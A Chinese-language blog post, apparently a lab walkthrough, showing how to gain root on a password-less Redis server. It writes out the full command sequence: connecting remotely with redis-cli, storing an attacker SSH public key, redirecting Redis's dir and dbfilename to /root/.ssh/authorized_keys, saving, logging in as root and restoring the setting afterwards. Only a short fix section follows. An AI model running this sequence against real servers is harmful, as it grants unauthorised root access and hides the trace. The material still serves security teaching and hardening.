---
title: Redis 远程无密码访问提权
date: 2018-05-04 00:00:00
tags: ["Redis"]
abbrlink: redis-yuan-cheng-wu-mi-ma-fang-wen-ti-quan
img: ""
comments: false
---

## 漏洞描述
借助redis内置命令，可以对现有数据进行恶意清空
如果Redis以root身份运行，可往服务器上写入SSH公钥文件，直接登录服务器

## 漏洞原理
如果redis启动监听外网端口，且未配置安全密码访问；
当redis以root用户身份运行时，就可以借助链接到redis，通过redis内置命令修改 dir 和 dbfilename
从而可往服务器的任何位置写入任何内容的文件，当然/root/.ssh/authorized_keys文件也不例外，呵呵了吧



## 体验一把提权
目标主机：192.168.203.224 （以root身份启动一个redis实例，端口为4700）
攻击主机：192.168.203.78

1、在192.168.203.78 ，远程链接redis 192.168.203.224:4700 ，查看一下当前的key

```
[root@vm ~]# redis-cli -h 192.168.203.224 -p 4700
redis 192.168.203.224:4700> keys *
1) "huangdc"
redis 192.168.203.224:4700> get huangdc
"1"
[root@vm ~]# redis-cli -h 192.168.203.224 -p 4700
redis 192.168.203.224:4700> keys *
1) "huangdc"
redis 192.168.203.224:4700> get huangdc
"1"
```
2、在192.168.203.78 生成公私钥文件

```bash
[root@vm ~]# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
b1:ca:19:f9:80:9c:5d:db:5d:f8:67:ec:94:b8:e4:c8 root@vm.boyaa.com
[root@vm ~]# ll /root/.ssh/
总计 12
-rw------- 1 root root 1675 07-19 16:56 id_rsa
-rw-r--r-- 1 root root  405 07-19 16:56 id_rsa.pub
-rw-r--r-- 1 root root 1974 2015-11-18 known_hosts
[root@vm ~]# (echo -e "\n";cat /root/.ssh/id_rsa.pub;echo -e "\n") > mypubkey.txt
[root@vm ~]# cat mypubkey.txt 


ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvZGEjiEH+TlsvM+wctETOyF9A6QobMteoR47LYk6KFKwcHBvSdJs5UEp62Z9pZWpqaew8d8SV/d9FzhOrNilMXndpjZBDwQmq11MWforei4VPGF8UVUO4o4oleUkg3H7wGrXBQHEOLZnMCQSdql+Xe8eHUqXAMYoU+a6QPz1dEqF4/6r0n+f2QUMt+gTadg8ZiHTvyx5HI9ZCTuGJ8ulNG/qwd1KsOaJJgdFNq5OYg4izV1U6JnGju9yOFWNYtWrGUAAbH0Pv9ylmRq+4R2xdj5iEbXma2VTZsMl6XPx12ZXJCcdS4u8NJExTgCjMRvB01UyFva3pETdgNDOF5fM6Q== root@vm.boyaa.com
```
3、在192.168.203.78 将公钥以key值的形式写入redis


```
[root@vm ~]# 
[root@vm ~]# cat mypubkey.txt |redis-cli -h 192.168.203.224 -p 4700 -x set mypubkey
OK
[root@vm ~]# redis-cli -h 192.168.203.224 -p 4700
redis 192.168.203.224:4700> keys *
1) "mypubkey"
2) "huangdc"
redis 192.168.203.224:4700> get mypubkey
"\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvZGEjiEH+TlsvM+wctETOyF9A6QobMteoR47LYk6KFKwcHBvSdJs5UEp62Z9pZWpqaew8d8SV/d9FzhOrNilMXndpjZBDwQmq11MWforei4VPGF8UVUO4o4oleUkg3H7wGrXBQHEOLZnMCQSdql+Xe8eHUqXAMYoU+a6QPz1dEqF4/6r0n+f2QUMt+gTadg8ZiHTvyx5HI9ZCTuGJ8ulNG/qwd1KsOaJJgdFNq5OYg4izV1U6JnGju9yOFWNYtWrGUAAbH0Pv9ylmRq+4R2xdj5iEbXma2VTZsMl6XPx12ZXJCcdS4u8NJExTgCjMRvB01UyFva3pETdgNDOF5fM6Q== root@vm.boyaa.com\n\n\n"
redis 192.168.203.224:4700> 
redis 192.168.203.224:4700> config get dir
1) "dir"
2) "/data/nosql/redis_4700"
redis 192.168.203.224:4700> config set dir /root/.ssh/
OK
redis 192.168.203.224:4700> 
redis 192.168.203.224:4700> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
redis 192.168.203.224:4700> config set dbfilename "authorized_keys"
OK
redis 192.168.203.224:4700> 
redis 192.168.203.224:4700> save
OK
redis 192.168.203.224:4700> CONFIG set dir "/data/nosql/redis_4700"
OK
redis 192.168.203.224:4700> save
OK
redis 192.168.203.224:4700>
# 这样就把公钥写进目标主机的/root/.ssh下，并且名称为authorized_keys，了解ssh的都会知道，这样我们就完成了远程无密码访问了
# 记得要把 dir 的值还原回去，呵呵
```
4、远程登录

```
[root@vm ~]# ssh 192.168.203.224
The authenticity of host '192.168.203.224 (192.168.203.224)' can't be established.
RSA key fingerprint is 53:47:d1:c6:ed:2e:69:32:75:1a:55:47:db:1b:70:3f.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.203.224' (RSA) to the list of known hosts.
Last login: Fri Mar 25 11:18:25 2016 from 192.168.100.130

################################################################
#      非工作时间，请注意操作，你的一切操作都记录在案          #
################################################################
#  Attention! Non-work time! Your operation will be recorded!  #
################################################################


[root@server ~]# 
[root@server ~]# who am i
root     pts/43       2016-07-19 17:33 (192.168.203.78)
[root@server ~]# 
[root@server ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP qlen 1000
    link/ether 00:50:56:bf:3b:0c brd ff:ff:ff:ff:ff:ff
    inet 192.168.203.224/24 brd 192.168.203.255 scope global eth1
    inet6 fe80::250:56ff:febf:3b0c/64 scope link 
       valid_lft forever preferred_lft forever
```

这样，就有了root 权限，想干嘛都行呀

**建议修复方案（需要重启redis才能生效）**
1. 设置访问密码
在 `redis.conf` 中找到“`requirepass`”字段，在后面填上你需要的密码
2. 修改redis服务运行账号
请以较**低权限**账号运行redis服务，且**禁用**该账号的登录权限
